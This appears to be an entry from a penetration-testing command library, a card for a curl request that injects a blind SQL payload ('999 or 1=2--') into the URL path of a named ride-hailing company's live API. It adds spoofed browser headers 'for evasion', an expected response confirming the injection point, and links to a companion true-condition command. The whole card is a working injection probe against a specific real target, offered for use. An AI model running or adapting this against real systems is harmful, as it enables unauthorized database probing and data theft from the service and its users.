---
data: >-
  curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0
  (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept:
  application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H
  'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H
  'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H
  'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H
  'Connection: close'
  'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
tags:
  - sqli
  - web
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: dad66c0d-1cd9-403b-a3fa-bef5549f12cc
created_at: '2025-12-14T03:15:10.032Z'
updated_at: '2025-12-14T03:15:10.032Z'
verified: false
validated: true
submitted: true
---
# curl-blind-sqli-false-condition

## Command

```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

## Description

This command tests a false SQL condition 'or 1=2--' in the URL path, expecting an empty response to confirm the blind SQLi point.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP headers | Yes |
| `-s` | Silent mode | Yes |
| `-k` | Insecure SSL | Yes |
| `-X GET` | GET method | Yes |
| `-H 'Host: ...'` | Host header | Yes |
| `-H 'User-Agent: ...'` | Browser simulation | Yes |
| URL | Endpoint with false payload | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X GET 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

### Advanced Usage

Full headers for evasion.

## Expected Output

HTTP/1.1 200 OK with empty JSON array, e.g., {"data": []}

## Related

- [[commands/curl-blind-sqli-true-condition]]
- [[procedures/Inject-False-SQL-Condition-via-Curl]]
